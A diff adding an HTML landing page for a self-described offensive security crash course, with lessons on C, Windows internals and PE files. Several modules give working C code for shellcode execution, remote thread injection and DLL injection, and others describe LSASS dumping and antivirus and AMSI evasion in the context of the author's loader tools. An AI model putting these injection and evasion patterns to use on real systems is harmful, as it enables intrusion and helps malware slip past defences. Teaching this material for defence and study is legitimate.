@@ -1,0 +1,1042 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>22DIV CRASH COURSE — Learn From Zero. Free.</title>
+  <meta name="description" content="Free offensive security crash course. Windows internals, C programming, hacking fundamentals. Built by a researcher who learned by doing — traced back to teach it properly.">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23010901'/><text x='50%25' y='60%25' font-size='20' text-anchor='middle' dominant-baseline='middle' fill='%2300cc44' font-family='monospace' font-weight='bold'>22</text></svg>">
+  <script src="site.js" defer></script>
+  <style>
+    :root {
+      --bg:     #010901;
+      --bg2:    #010e01;
+      --bg3:    #020f02;
+      --border: #0d3a0d;
+      --border2:#1a6a1a;
+      --green:  #4adc6a;
+      --gdim:   #2a7a2a;
+      --gbright:#6aff8a;
+      --cyan:   #4adcdc;
+      --cdim:   #1a6a6a;
+      --gold:   #dca84a;
+      --gdold:  #6a5a1a;
+      --red:    #dc4a4a;
+      --rdim:   #5a1a1a;
+      --text:   #c0dcc0;
+      --tdim:   #6a8a6a;
+      --tfaint: #3a5a3a;
+    }
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body{background:var(--bg);color:var(--text);font-family:'Courier New',monospace;overflow-x:hidden;}
+
+    /* NAV */
+    nav{position:sticky;top:0;z-index:100;background:rgba(1,9,1,.97);border-bottom:1px solid var(--border);padding:.8rem 2rem;display:flex;justify-content:space-between;align-items:center;}
+    .nav-logo{font-size:.7rem;font-weight:700;color:var(--green);letter-spacing:.18em;text-decoration:none;}
+    .nav-links{display:flex;gap:1.4rem;}
+    .nav-links a{font-size:.52rem;color:var(--tdim);letter-spacing:.12em;text-decoration:none;}
+    .nav-links a:hover{color:var(--green);}
+
+    /* HERO */
+    .hero{text-align:center;padding:5rem 2rem 4rem;background:linear-gradient(180deg,#011201 0%,var(--bg) 100%);border-bottom:2px solid var(--border);position:relative;overflow:hidden;}
+    .hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 70% 50% at 50% 30%,rgba(42,122,42,.08) 0%,transparent 70%);pointer-events:none;}
+    .hero-tag{font-size:.44rem;letter-spacing:.3em;color:var(--gdim);margin-bottom:.8rem;}
+    .hero-title{font-size:clamp(2rem,6vw,3.8rem);color:var(--green);font-weight:900;letter-spacing:.08em;line-height:1.1;margin-bottom:1rem;text-shadow:0 0 40px rgba(74,220,106,.25);}
+    .hero-sub{font-size:.88rem;color:var(--text);max-width:700px;margin:0 auto 1.4rem;line-height:1.8;}
+    .hero-honest{max-width:640px;margin:0 auto 2rem;background:#010f01;border:1px solid var(--border);border-left:3px solid var(--gdim);padding:1.2rem 1.5rem;text-align:left;}
+    .hero-honest p{font-size:.66rem;color:var(--tdim);line-height:1.9;}
+    .hero-honest strong{color:var(--green);}
+    .hero-cta{display:inline-block;background:var(--gdim);color:#010f01;font-size:.64rem;font-weight:700;letter-spacing:.18em;padding:.8rem 2rem;text-decoration:none;}
+    .hero-cta:hover{background:var(--green);}
+    .hero-free{font-size:.52rem;color:var(--tdim);margin-top:.7rem;letter-spacing:.12em;}
+
+    /* CONTAINER */
+    .container{max-width:960px;margin:0 auto;padding:0 2rem;}
+    @media(max-width:600px){.container{padding:0 1rem;}}
+
+    /* PROGRESS BAR */
+    #progress-bar-wrap{background:var(--bg3);border-bottom:1px solid var(--border);padding:.6rem 2rem;display:flex;align-items:center;gap:1rem;position:sticky;top:52px;z-index:90;}
+    #progress-label{font-size:.48rem;color:var(--tdim);letter-spacing:.14em;white-space:nowrap;}
+    #progress-bar{flex:1;height:4px;background:#0a2a0a;position:relative;overflow:hidden;}
+    #progress-fill{height:100%;background:var(--green);width:0%;transition:width .4s ease;}
+    #progress-count{font-size:.48rem;color:var(--green);letter-spacing:.1em;white-space:nowrap;}
+
+    /* TRACK HEADER */
+    .track-header{padding:3rem 0 1.5rem;text-align:center;}
+    .track-tag{font-size:.44rem;letter-spacing:.26em;color:var(--tdim);margin-bottom:.5rem;}
+    .track-title{font-size:1.5rem;color:var(--green);font-weight:700;letter-spacing:.08em;margin-bottom:.5rem;}
+    .track-desc{font-size:.64rem;color:var(--tdim);line-height:1.7;max-width:560px;margin:0 auto;}
+    .track-divider{height:1px;background:linear-gradient(90deg,transparent,var(--gdim),transparent);margin:2rem 0;}
+
+    /* MODULE CARD */
+    .module{background:var(--bg3);border:1px solid var(--border);margin-bottom:.8rem;overflow:hidden;}
+    .module.done{border-color:#1a5a1a;}
+    .module.locked{border-color:var(--rdim);opacity:.85;}
+    .module-head{display:flex;align-items:center;gap:.8rem;padding:1rem 1.2rem;cursor:pointer;user-select:none;}
+    .module-head:hover{background:#020f02;}
+    .module-num{font-size:.52rem;color:var(--tfaint);letter-spacing:.1em;flex-shrink:0;width:2.5rem;}
+    .module-title{flex:1;font-size:.72rem;color:var(--text);font-weight:700;letter-spacing:.04em;}
+    .module.done .module-title{color:var(--green);}
+    .module.locked .module-title{color:var(--tdim);}
+    .module-tags{display:flex;gap:.4rem;flex-shrink:0;}
+    .tag{font-size:.38rem;letter-spacing:.12em;padding:.15rem .5rem;font-weight:700;}
+    .tag.free{background:var(--gdim);color:#010f01;}
+    .tag.paid{background:var(--rdim);color:var(--red);}
+    .tag.c{background:#0a1a2a;color:#4a9adc;}
+    .tag.py{background:#1a1a0a;color:#dcdc4a;}
+    .tag.ps{background:#0a0a1a;color:#9a4adc;}
+    .module-check{width:1.2rem;height:1.2rem;border:1px solid var(--border2);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:.7rem;color:var(--green);cursor:pointer;}
+    .module.done .module-check{background:var(--gdim);border-color:var(--gdim);}
+    .module-arrow{font-size:.6rem;color:var(--tfaint);transition:transform .2s;flex-shrink:0;}
+    .module.open .module-arrow{transform:rotate(90deg);}
+
+    /* MODULE BODY */
+    .module-body{display:none;padding:0 1.2rem 1.2rem;border-top:1px solid var(--border);}
+    .module.open .module-body{display:block;}
+    .module-desc{font-size:.64rem;color:var(--tdim);line-height:1.8;margin:.8rem 0 1rem;}
+    .module-concepts{margin-bottom:1rem;}
+    .concept-label{font-size:.42rem;letter-spacing:.2em;color:var(--tfaint);margin-bottom:.5rem;}
+    .concept{font-size:.6rem;color:var(--tdim);line-height:1.6;padding:.15rem 0;}
+    .concept::before{content:'→ ';color:var(--gdim);}
+
+    /* CODE BLOCK */
+    .code-block{background:#000a00;border:1px solid #0a1a0a;border-left:3px solid var(--gdim);padding:1rem 1.2rem;margin:1rem 0;overflow-x:auto;}
+    .code-block pre{font-size:.58rem;color:#b0dcb0;line-height:1.8;white-space:pre;}
+    .code-block .comment{color:#3a7a3a;}
+    .code-block .keyword{color:#4adc6a;}
+    .code-block .type{color:#4adcdc;}
+    .code-block .string{color:#dca84a;}
+    .code-block .num{color:#dc9a4a;}
+
+    /* LESSON TEXT */
+    .lesson{font-size:.64rem;color:var(--tdim);line-height:1.9;margin:.6rem 0;}
+    .lesson strong{color:var(--text);}
+    .lesson em{color:var(--green);font-style:normal;}
+    .lesson-callout{background:#020f02;border-left:3px solid var(--gdim);padding:.8rem 1rem;margin:.8rem 0;font-size:.62rem;color:var(--text);line-height:1.8;}
+
+    /* MODULE LINKS */
+    .module-links{margin-top:1rem;display:flex;gap:.6rem;flex-wrap:wrap;}
+    .module-link{font-size:.52rem;color:var(--gdim);letter-spacing:.1em;text-decoration:none;border:1px solid var(--border);padding:.3rem .8rem;}
+    .module-link:hover{color:var(--green);border-color:var(--gdim);}
+    .module-link.locked{color:var(--tdim);pointer-events:none;border-color:var(--rdim);}
+
+    /* SCROLLBAR */
+    ::-webkit-scrollbar{width:6px;}
+    ::-webkit-scrollbar-track{background:var(--bg);}
+    ::-webkit-scrollbar-thumb{background:var(--gdim);}
+
+    /* FOOTER */
+    .footer{background:var(--bg3);border-top:1px solid var(--border);text-align:center;padding:2rem;font-size:.46rem;color:var(--tfaint);letter-spacing:.08em;line-height:2;}
+    .footer a{color:var(--gdim);text-decoration:none;}
+    .footer a:hover{color:var(--green);}
+
+    /* GLOW */
+    .glow{height:1px;background:linear-gradient(90deg,transparent,var(--gdim),transparent);margin:0;}
+
+    @keyframes neonpulse{0%,100%{text-shadow:0 0 20px rgba(74,220,106,.2);}50%{text-shadow:0 0 40px rgba(74,220,106,.5),0 0 80px rgba(74,220,106,.2);}}
+    .neon{animation:neonpulse 3s ease-in-out infinite;}
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="index.html">// RAINFANTRY</a>
+  <div class="nav-links">
+    <a href="#zero">ZERO</a>
+    <a href="#windows">WINDOWS</a>
+    <a href="#hack">HACK</a>
+    <a href="#tools">TOOLS</a>
+    <a href="pricing.html">PRICING</a>
+  </div>
+</nav>
+
+<!-- HERO -->
+<header class="hero">
+  <div class="hero-tag">// 22ND SURVEY DIVISION — FREE CURRICULUM</div>
+  <h1 class="hero-title neon">LEARN WHAT<br>I BUILT.</h1>
+  <p class="hero-sub">Windows internals. C programming. Hacking. The actual foundations behind the tools — taught from zero, for free.</p>
+
+  <div class="hero-honest">
+    <p><strong>Straight talk:</strong> I built IRON-DOME, CHEYANNE, STARKILLER — and I used AI to help write them. They work. But for a while I didn't fully understand every line of every thing I shipped.</p>
+    <p style="margin-top:.6rem;">So I traced back. I learned the actual foundations — memory, the Windows kernel, how AV works, what makes shellcode shellcode. <strong>This page is that journey, taught properly, from zero.</strong></p>
+    <p style="margin-top:.6rem;">Knowledge is free. Source code costs money. That's the deal.</p>
+  </div>
+
+  <a class="hero-cta" href="#zero">START FROM ZERO →</a>
+  <div class="hero-free">100% FREE &nbsp;·&nbsp; 22 MODULES &nbsp;·&nbsp; TRACK YOUR PROGRESS</div>
+</header>
+
+<!-- PROGRESS -->
+<div id="progress-bar-wrap">
+  <span id="progress-label">// PROGRESS</span>
+  <div id="progress-bar"><div id="progress-fill"></div></div>
+  <span id="progress-count">0 / 18 FREE</span>
+</div>
+
+<div class="glow"></div>
+
+<!-- ──────────────────────────────────────────────────────── -->
+<!-- TRACK 0: ZERO — ABSOLUTE BEGINNER -->
+<!-- ──────────────────────────────────────────────────────── -->
+<section id="zero">
+<div class="container">
+  <div class="track-header">
+    <div class="track-tag">// TRACK 0 — START HERE</div>
+    <h2 class="track-title">ZERO TO CODER</h2>
+    <p class="track-desc">If you don't know what a CPU is, start here. No shame. This is what school skips.</p>
+  </div>
+
+  <!-- MODULE 01 -->
+  <div class="module" id="m01">
+    <div class="module-head" onclick="toggleModule('m01')">
+      <span class="module-num">01</span>
+      <span class="module-title">What is a Computer? (For Real This Time)</span>
+      <div class="module-tags"><span class="tag free">FREE</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m01')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">Before you can hack anything, you need to understand what you're hacking. Most courses skip this. We don't.</p>
+
+      <p class="lesson">A computer has four things that matter:</p>
+      <p class="lesson"><em>CPU</em> — the brain. Executes instructions one at a time, billions per second. Doesn't "think". Just adds numbers and moves data around. That's literally it.</p>
+      <p class="lesson"><em>RAM</em> — short-term memory. Everything that's running right now lives in RAM. When you close a program, its RAM is freed. When you reboot, all RAM is wiped.</p>
+      <p class="lesson"><em>Storage</em> (HDD/SSD) — long-term memory. Files live here. Slow compared to RAM. When you run a program, Windows copies it from storage into RAM first.</p>
+      <p class="lesson"><em>OS</em> — the referee. Windows sits between your program and the hardware. It decides what your code is and isn't allowed to do.</p>
+
+      <div class="lesson-callout">
+        <strong>Why this matters for hacking:</strong> Malware exploits the gap between what the OS thinks is happening and what's actually happening in RAM. Every bypass technique you'll learn — shellcode injection, process hollowing, HWBP AMSI bypass — is just manipulating memory in a way the OS doesn't expect.
+      </div>
+
+      <p class="lesson">Numbers a computer understands: <strong>binary</strong> (0s and 1s), <strong>hexadecimal</strong> (0-9 and A-F). You'll see hex everywhere in hacking. <em>0x41 = 65 = 'A'</em> — same value, three representations.</p>
+
+      <div class="code-block"><pre><span class="comment">// Decimal → Hex → Binary</span>
+<span class="num">65</span>      = <span class="num">0x41</span>  = <span class="num">01000001</span>  → ASCII 'A'
+<span class="num">255</span>     = <span class="num">0xFF</span>  = <span class="num">11111111</span>  → max value of 1 byte
+<span class="num">4096</span>    = <span class="num">0x1000</span>             → common memory page size</pre></div>
+
+      <div class="module-links">
+        <a class="module-link" href="guide.html">→ FULL BEGINNERS GUIDE</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 02 -->
+  <div class="module" id="m02">
+    <div class="module-head" onclick="toggleModule('m02')">
+      <span class="module-num">02</span>
+      <span class="module-title">C Programming — The Language That Runs the World</span>
+      <div class="module-tags"><span class="tag free">FREE</span><span class="tag c">C</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m02')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">Windows, Linux, every AV engine, every kernel — written in C. You need C. Not to be a software developer. To understand what your tools are actually doing.</p>
+
+      <p class="lesson">C is low-level. It doesn't protect you. It gives you direct access to memory. That's why it's used for malware, kernels, and exploits.</p>
+
+      <div class="code-block"><pre><span class="comment">// Every C program starts here</span>
+<span class="keyword">#include</span> <span class="string">&lt;stdio.h&gt;</span>    <span class="comment">// gives us printf()</span>
+<span class="keyword">#include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">// gives us Windows API</span>
+
+<span class="type">int</span> main() {
+    <span class="comment">// This prints to console</span>
+    printf(<span class="string">"Hello, kernel\n"</span>);
+
+    <span class="comment">// This allocates 1000 bytes of memory</span>
+    <span class="type">char</span>* buf = malloc(<span class="num">1000</span>);
+
+    <span class="comment">// This frees it (always free what you malloc)</span>
+    free(buf);
+
+    <span class="keyword">return</span> <span class="num">0</span>;
+}</pre></div>
+
+      <p class="lesson">Key concepts you need right now:</p>
+      <div class="module-concepts">
+        <div class="concept-label">WHAT TO LEARN</div>
+        <div class="concept">Pointers — a variable that holds a memory address, not a value</div>
+        <div class="concept">malloc/free — manually allocate and release heap memory</div>
+        <div class="concept">structs — group related data together (Windows uses these everywhere)</div>
+        <div class="concept">function pointers — a variable that points to a function (used in shellcode)</div>
+        <div class="concept">casting — treating the same memory as a different type</div>
+      </div>
+
+      <div class="code-block"><pre><span class="comment">// Pointer example — this is how shellcode works</span>
+<span class="type">unsigned char</span> shellcode[] = { <span class="num">0x90</span>, <span class="num">0x90</span>, <span class="num">0xC3</span> }; <span class="comment">// NOP NOP RET</span>
+
+<span class="comment">// Cast shellcode bytes to a function pointer</span>
+<span class="type">void</span> (*func)() = (<span class="type">void</span>(*)())shellcode;
+
+<span class="comment">// Execute it — this is literally what loaders do</span>
+func();  <span class="comment">// CPU jumps to our bytes and runs them</span></pre></div>
+
+      <div class="lesson-callout">IRON-DOME uses this exact pattern. The loader allocates memory, copies shellcode in, casts it to a function pointer, calls it. Now you know what that means.</div>
+
+      <div class="module-links">
+        <a class="module-link" href="reader.html?book=guide&ch=01">→ C BASICS CHAPTER</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 03 -->
+  <div class="module" id="m03">
+    <div class="module-head" onclick="toggleModule('m03')">
+      <span class="module-num">03</span>
+      <span class="module-title">Python & PowerShell — Your Daily Drivers</span>
+      <div class="module-tags"><span class="tag free">FREE</span><span class="tag py">PY</span><span class="tag ps">PS</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m03')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">C is for tools. Python is for scripts. PowerShell is for Windows post-exploitation. You need all three.</p>
+
+      <div class="code-block"><pre><span class="comment"># Python — fast prototyping, file parsing, network tools</span>
+<span class="keyword">import</span> struct, socket
+
+<span class="comment"># Read a PE file header</span>
+<span class="keyword">with</span> open(<span class="string">'calc.exe'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:
+    data = f.read(<span class="num">64</span>)
+    magic = data[<span class="num">0</span>:<span class="num">2</span>]   <span class="comment"># MZ header — b'\x4D\x5A'</span>
+    print(f<span class="string">"Magic: {magic}"</span>)  <span class="comment"># Every .exe starts with MZ</span></pre></div>
+
+      <div class="code-block"><pre><span class="comment"># PowerShell — post-exploitation on Windows</span>
+<span class="comment"># List all processes (who's running)</span>
+Get-Process | Select-Object Name, Id, Path
+
+<span class="comment"># Find all scheduled tasks (persistence check)</span>
+Get-ScheduledTask | Where-Object {<span class="keyword">$_</span>.State -eq <span class="string">'Ready'</span>}
+
+<span class="comment"># Dump LSASS (credential harvesting — authorized use only)</span>
+<span class="comment"># This is what Mimikatz does under the hood</span>
+<span class="type">[System.Runtime.InteropServices.Marshal]</span>::Copy(...)</pre></div>
+
+      <div class="module-links">
+        <a class="module-link" href="guide.html">→ SCRIPTING GUIDE</a>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /container -->
+</section>
+
+<div class="glow"></div>
+
+<!-- ──────────────────────────────────────────────────────── -->
+<!-- TRACK 1: WINDOWS INTERNALS -->
+<!-- ──────────────────────────────────────────────────────── -->
+<section id="windows" style="background:var(--bg2);">
+<div class="container">
+  <div class="track-header">
+    <div class="track-tag">// TRACK 1</div>
+    <h2 class="track-title">WINDOWS INTERNALS</h2>
+    <p class="track-desc">You can't exploit what you don't understand. This is the OS you're attacking. Learn how it actually works.</p>
+  </div>
+
+  <!-- MODULE 04 -->
+  <div class="module" id="m04">
+    <div class="module-head" onclick="toggleModule('m04')">
+      <span class="module-num">04</span>
+      <span class="module-title">Processes, Threads, and Handles</span>
+      <div class="module-tags"><span class="tag free">FREE</span><span class="tag c">C</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m04')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">Every attack involves manipulating processes. You need to know what they are at the kernel level.</p>
+
+      <p class="lesson">A <em>process</em> is an isolated container. It has its own virtual memory space. Other processes can't read its memory — unless you open a handle to them.</p>
+      <p class="lesson">A <em>thread</em> is the execution unit inside a process. One process can have many threads. Each thread has its own stack. Context switches happen between threads.</p>
+      <p class="lesson">A <em>handle</em> is a reference to a kernel object (process, file, registry key). To manipulate another process, you need a handle with the right permissions (e.g. <code>PROCESS_VM_WRITE</code>).</p>
+
+      <div class="code-block"><pre><span class="comment">// Open a handle to notepad.exe for injection</span>
+<span class="type">HANDLE</span> hProc = OpenProcess(
+    PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
+    FALSE,        <span class="comment">// don't inherit handle</span>
+    targetPID     <span class="comment">// PID of notepad.exe</span>
+);
+
+<span class="comment">// Allocate memory in the remote process</span>
+<span class="type">LPVOID</span> addr = VirtualAllocEx(hProc, NULL, shellcodeSize,
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE);  <span class="comment">// RWX — AV watches for this</span>
+
+<span class="comment">// Write shellcode into it</span>
+WriteProcessMemory(hProc, addr, shellcode, shellcodeSize, NULL);
+
+<span class="comment">// Create a thread there — shellcode now runs in notepad</span>
+CreateRemoteThread(hProc, NULL, <span class="num">0</span>,
+    (<span class="type">LPTHREAD_START_ROUTINE</span>)addr, NULL, <span class="num">0</span>, NULL);</pre></div>
+
+      <div class="lesson-callout">This is remote thread injection — the simplest form of process injection. CHEYANNE uses a more sophisticated version. Now you can read that code and understand it.</div>
+
+      <div class="module-links">
+        <a class="module-link" href="rootkit.html">→ ROOTKIT MODULE</a>
+        <a class="module-link" href="reverseeng.html">→ REVERSE ENGINEERING</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 05 -->
+  <div class="module" id="m05">
+    <div class="module-head" onclick="toggleModule('m05')">
+      <span class="module-num">05</span>
+      <span class="module-title">Memory: Stack, Heap, Virtual Address Space</span>
+      <div class="module-tags"><span class="tag free">FREE</span><span class="tag c">C</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m05')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">Every exploit you'll ever write involves manipulating memory. This is the map.</p>
+
+      <p class="lesson">Windows gives each process a 64-bit virtual address space — <em>0x000000000000 to 0x7FFFFFFFFFFF</em> for user mode, kernel above that. It's not real memory — it's a lie the OS tells each process so they don't stomp on each other.</p>
+      <p class="lesson"><em>Stack</em> — automatic, fast. Function calls live here. Local variables. Grows downward. Fixed size (~1MB per thread). <strong>Buffer overflows target the stack.</strong></p>
+      <p class="lesson"><em>Heap</em> — dynamic, manually managed. malloc() puts things here. Your shellcode injection targets heap or specially allocated memory. Grows upward.</p>
+      <p class="lesson"><em>Sections</em> — .text (code), .data (globals), .rdata (constants), .reloc (relocation table). The PE file maps these into memory. Knowing this lets you patch or redirect code.</p>
+
+      <div class="code-block"><pre><span class="comment">// Virtual memory layout (simplified, x64 Windows)</span>
+<span class="comment">// 0x000000000000 - 0x00007FFFFFFFFFFF  →  User mode</span>
+<span class="comment">// 0xFFFF800000000000 - end              →  Kernel mode</span>
+
+<span class="comment">// Query memory permissions on a region</span>
+<span class="type">MEMORY_BASIC_INFORMATION</span> mbi;
+VirtualQuery(address, &amp;mbi, sizeof(mbi));
+
+<span class="comment">// mbi.Protect tells you: PAGE_EXECUTE_READ, PAGE_READWRITE, etc.</span>
+<span class="comment">// AV scans for PAGE_EXECUTE_READWRITE — that's the red flag</span>
+printf(<span class="string">"Protect: 0x%X\n"</span>, mbi.Protect);</pre></div>
+
+      <div class="module-links">
+        <a class="module-link" href="reverseeng.html">→ MEMORY ANALYSIS</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 06 -->
+  <div class="module" id="m06">
+    <div class="module-head" onclick="toggleModule('m06')">
+      <span class="module-num">06</span>
+      <span class="module-title">The PE File Format — How .exe Files Work</span>
+      <div class="module-tags"><span class="tag free">FREE</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m06')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">Every Windows executable is a PE file. AV parses PE files to find malware. You parse PE files to understand or manipulate them.</p>
+
+      <p class="lesson">PE = Portable Executable. Every .exe, .dll, .sys is one. Structure:</p>
+      <div class="module-concepts">
+        <div class="concept-label">STRUCTURE</div>
+        <div class="concept">DOS Header — starts with MZ (0x4D5A). Legacy. Points to PE header.</div>
+        <div class="concept">PE Header — "PE\0\0" signature. Contains machine type, timestamp, flags.</div>
+        <div class="concept">Optional Header — entry point address, image base, section alignment.</div>
+        <div class="concept">Section Table — .text, .data, .rdata, .rsrc locations and sizes.</div>
+        <div class="concept">Import Table (IAT) — which DLLs and functions this binary calls.</div>
+        <div class="concept">Export Table — functions this DLL exposes.</div>
+      </div>
+
+      <div class="code-block"><pre><span class="comment"># Python: parse PE header manually</span>
+<span class="keyword">import</span> struct
+
+<span class="keyword">with</span> open(<span class="string">'sample.exe'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:
+    data = f.read()
+
+<span class="comment"># DOS header: first 2 bytes = MZ</span>
+assert data[<span class="num">0</span>:<span class="num">2</span>] == b<span class="string">'MZ'</span>
+
+<span class="comment"># Offset to PE header is at 0x3C</span>
+pe_offset = struct.unpack_from(<span class="string">'&lt;I'</span>, data, <span class="num">0x3C</span>)[<span class="num">0</span>]
+
+<span class="comment"># PE signature</span>
+assert data[pe_offset:pe_offset+<span class="num">4</span>] == b<span class="string">'PE\x00\x00'</span>
+
+<span class="comment"># Entry point (RVA) — where execution starts</span>
+ep = struct.unpack_from(<span class="string">'&lt;I'</span>, data, pe_offset + <span class="num">40</span>)[<span class="num">0</span>]
+print(f<span class="string">"Entry point RVA: 0x{ep:08X}"</span>)</pre></div>
+
+      <div class="lesson-callout">IRON-DOME manually parses PE files to load them reflectively — in memory, without touching disk. Now you know why that works: because you can reconstruct all the OS's loading steps yourself.</div>
+
+      <div class="module-links">
+        <a class="module-link" href="reverseeng.html">→ REVERSE ENGINEERING MODULE</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 07 -->
+  <div class="module" id="m07">
+    <div class="module-head" onclick="toggleModule('m07')">
+      <span class="module-num">07</span>
+      <span class="module-title">Windows API — The Interface to Everything</span>
+      <div class="module-tags"><span class="tag free">FREE</span><span class="tag c">C</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m07')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">WinAPI is how user-mode code talks to the kernel. Every tool you build — every injection, every evasion — goes through WinAPI or syscalls beneath it.</p>
+
+      <p class="lesson">The call chain: <em>your code → WinAPI (kernel32.dll) → ntdll.dll → syscall → kernel</em>. AV hooks happen at ntdll. That's why IRON-DOME uses direct syscalls to bypass them.</p>
+
+      <div class="code-block"><pre><span class="comment">// Key WinAPI functions for offensive work</span>
+VirtualAlloc()         <span class="comment">// allocate memory</span>
+VirtualAllocEx()       <span class="comment">// allocate in another process</span>
+WriteProcessMemory()   <span class="comment">// write into another process</span>
+CreateRemoteThread()   <span class="comment">// start thread in another process</span>
+NtCreateThreadEx()     <span class="comment">// ntdll version — harder to hook</span>
+OpenProcess()          <span class="comment">// get handle to target process</span>
+LoadLibrary()          <span class="comment">// load a DLL</span>
+GetProcAddress()       <span class="comment">// find a function by name in a DLL</span>
+SetWindowsHookEx()     <span class="comment">// hook keyboard, mouse etc.</span>
+MiniDumpWriteDump()    <span class="comment">// dump process memory (LSASS)</span></pre></div>
+
+      <div class="lesson-callout">GetProcAddress is how you dynamically resolve function pointers at runtime. IRON-DOME does this to avoid having import table entries that AV can scan statically. You call GetProcAddress("VirtualAlloc") instead of calling VirtualAlloc directly — the function address isn't in the IAT.</div>
+
+      <div class="module-links">
+        <a class="module-link" href="irondome.html">→ IRON-DOME MODULE</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODULE 08 -->
+  <div class="module" id="m08">
+    <div class="module-head" onclick="toggleModule('m08')">
+      <span class="module-num">08</span>
+      <span class="module-title">DLLs — Dynamic Link Libraries &amp; Injection</span>
+      <div class="module-tags"><span class="tag free">FREE</span><span class="tag c">C</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m08')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">DLLs are loaded into process memory. DLL injection is one of the oldest and most reliable techniques.</p>
+
+      <p class="lesson">A DLL is a PE file that exports functions for other programs to use. When you call <code>MessageBox()</code>, Windows loads <code>user32.dll</code> into your process and calls its export.</p>
+      <p class="lesson">DLL Injection: force a target process to load your DLL. It runs inside the target's memory space with the target's permissions. You now own that process.</p>
+
+      <div class="code-block"><pre><span class="comment">// Classic DLL injection using LoadLibrary</span>
+
+<span class="comment">// 1. Get handle to target</span>
+<span class="type">HANDLE</span> hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+
+<span class="comment">// 2. Write DLL path string into target's memory</span>
+<span class="type">LPVOID</span> pathAddr = VirtualAllocEx(hProc, NULL,
+    strlen(dllPath)+<span class="num">1</span>, MEM_COMMIT, PAGE_READWRITE);
+WriteProcessMemory(hProc, pathAddr, dllPath, strlen(dllPath)+<span class="num">1</span>, NULL);
+
+<span class="comment">// 3. Make target call LoadLibrary on our DLL path</span>
+<span class="type">HMODULE</span> k32 = GetModuleHandle(<span class="string">"kernel32.dll"</span>);
+<span class="type">FARPROC</span> loadLib = GetProcAddress(k32, <span class="string">"LoadLibraryA"</span>);
+
+CreateRemoteThread(hProc, NULL, <span class="num">0</span>,
+    (<span class="type">LPTHREAD_START_ROUTINE</span>)loadLib,
+    pathAddr,   <span class="comment">// LoadLibrary's argument = our DLL path</span>
+    <span class="num">0</span>, NULL);   <span class="comment">// Target now loads our DLL. DllMain() runs.</span></pre></div>
+
+      <div class="module-links">
+        <a class="module-link" href="rootkit.html">→ ROOTKIT MODULE</a>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+<div class="glow"></div>
+
+<!-- ──────────────────────────────────────────────────────── -->
+<!-- TRACK 2: HACKING -->
+<!-- ──────────────────────────────────────────────────────── -->
+<section id="hack">
+<div class="container">
+  <div class="track-header">
+    <div class="track-tag">// TRACK 2</div>
+    <h2 class="track-title">OFFENSIVE TECHNIQUES</h2>
+    <p class="track-desc">The theory behind every technique in the tools. Understand it. Then you can adapt it.</p>
+  </div>
+
+  <!-- MODULE 09 -->
+  <div class="module" id="m09">
+    <div class="module-head" onclick="toggleModule('m09')">
+      <span class="module-num">09</span>
+      <span class="module-title">How Antivirus Actually Works</span>
+      <div class="module-tags"><span class="tag free">FREE</span></div>
+      <div class="module-check" onclick="event.stopPropagation();checkModule('m09')">✓</div>
+      <span class="module-arrow">▶</span>
+    </div>
+    <div class="module-body">
+      <p class="module-desc">You can't evade what you don't understand. AV has multiple detection layers. Each one has a bypass.</p>
+
+      <div class="module-concepts">
+        <div class="concept-label">AV DETECTION LAYERS</div>
+        <div class="concept">Static analysis — scans the file on disk. Looks for known byte signatures and strings. Bypass: encryption, packing, obfuscation.</div>
+        <div class="concept">Dynamic/heuristic — runs the file in a sandbox and watches what it does. Bypass: sleep, environment checks, timing attacks.</div>
+        <div class="concept">Behavioral — monitors API calls at runtime. Looks for VirtualAlloc+WriteProcessMemory+CreateRemoteThread chains. Bypass: syscalls, API unhooking.</div>
+        <div class="concept">AMSI (Antimalware Scan Interface) — intercepts PowerShell/JScript/VBScript before execution. Hooks at AmsiScanBuffer(). Bypass: patch or redirect that function.</div>
